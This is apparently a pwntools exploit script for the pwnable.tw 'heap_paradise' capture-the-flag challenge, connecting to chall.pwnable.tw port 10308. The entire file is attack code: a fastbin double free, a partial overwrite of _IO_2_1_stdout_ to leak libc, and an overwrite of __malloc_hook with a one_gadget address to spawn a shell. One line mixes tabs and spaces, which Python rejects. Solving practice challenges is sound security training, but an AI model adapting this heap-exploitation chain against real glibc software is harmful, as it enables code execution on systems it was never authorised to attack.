from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./pwnabletw_heap_paradise",env={"LD_PRELOAD":'./libc_64.so.6'})
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	libc = ELF("./libc_64.so.6")
	elf = ELF("./pwnabletw_heap_paradise")
else:
	p = remote("chall.pwnable.tw","10308")
	libc = ELF("./libc_64.so.6")
	elf = ELF("./pwnabletw_heap_paradise")

def add(size,content):
	p.sendafter("You Choice:","1")
	p.sendafter("Size :",str(size))
	p.sendafter("Data :",content)

def free(index):
	p.sendafter("You Choice:","2")
        p.sendafter("Index :",str(index))

code_base = 0x555555554000
def debugf():
	gdb.attach(p,"b *{b1}".format(b1 = hex(code_base + 0xDED)))

context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
#debugf()
add(0x60,"\x00"*8*11 + p64(0x71)) #0
add(0x60,"\x00"*8*11 + p64(0x41)) #1
add(0x20,p64(0) * 3 + p64(0x11)) #2
free(0)
free(1)
free(0)
add(0x60,"\x60") #3
add(0x60,"A") #4
add(0x60,"A") #5
add(0x60,p64(0xdeadbeef)+p64(0x91)) #6
free(1)
add(0x60,"\xdd\x25") #7
debugf()
free(0)
free(6)
free(0)
add(0x60,"\x70") #8
add(0x60,p64(0) + p64(0x71))
add(0x60,"\x00")
add(0x60,"\x00")
payload = "\x00"*3 + p64(0) * 6 + p64(0xfbad1800) + p64(0)*3 + "\x00"
add(0x60,payload)
p.recv(0x40)
if debug:
	libc.address = u64(p.recv(6).ljust(8,"\x00")) - 0x3c5600 + 0x1000
else:
	libc.address = u64(p.recv(6).ljust(8,"\x00")) - 0x3c5600 + 0x1000
log.success("libc_base:" + hex(libc.address))
free(0)
free(6)
free(0)
add(0x68,p64(0)*10 + p64(0) + p64(0x71) + p64(libc.symbols["__malloc_hook"] - 0x23))
add(0x60,p64(0))
if debug:
	payload = "aaa" + p64(0) * 2 + p64(libc.address + 0xef6c4)
else:
	payload = "aaa" + p64(0) * 2 + p64(libc.address + 0xef6c4)
add(0x60,payload)
free(2)
p.interactive()
